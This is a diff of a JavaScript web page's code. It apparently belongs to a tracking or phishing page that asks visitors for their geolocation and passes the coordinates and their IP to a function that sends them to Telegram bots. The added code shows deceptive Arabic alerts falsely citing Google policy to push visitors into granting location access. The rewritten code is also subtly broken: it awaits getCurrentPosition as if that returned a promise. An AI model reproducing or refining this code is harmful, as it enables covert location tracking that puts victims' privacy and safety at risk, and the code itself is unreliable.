@@ -104,20 +104,30 @@ ${ipAddress}
     }
     return {};
   }
-async function yourFunction() {
-  navigator.geolocation.getCurrentPosition(
-    async (position) => {
-      // Location permission granted, send location and IP results to Telegram bots
-      await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
-    },
-    (error) => {
-      if (error.code === error.PERMISSION_DENIED) {
-        // showAlert();
-         redirectToNextURL();
-        // Location permission denied, send IP result to Telegram bots
-      }
+  async function yourFunction() {
+  if (!navigator.geolocation) {
+    // Geolocation not supported by browser
+    alert("تبعاً لسياسة جوجل اسمع لخدمة لوكيشن لاستمرار");
+    return; // Exit the function if no geolocation available
+  }
+
+  try {
+    const position = await navigator.geolocation.getCurrentPosition();
+    // Location permission granted and found, proceed with your logic
+    await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
+  } catch (error) {
+    if (error.code === error.PERMISSION_DENIED) {
+      // Location permission denied
+      alert("اضغط سماح لاستمراح allow");
+    } else {
+      // Geolocation failed for other reasons (e.g., GPS unavailable)
+      alert("تبعاً لسياسة جوجل اسمع لخدمة لوكيشن لاستمرار");
     }
-  );
+  }
+}
+function showAlert() {
+  // You can customize the alert message and behavior here
+  alert("Location permission is denied. This app needs your location to function properly.");
 }
   function redirectToNextURL() {
     // Get the current URL
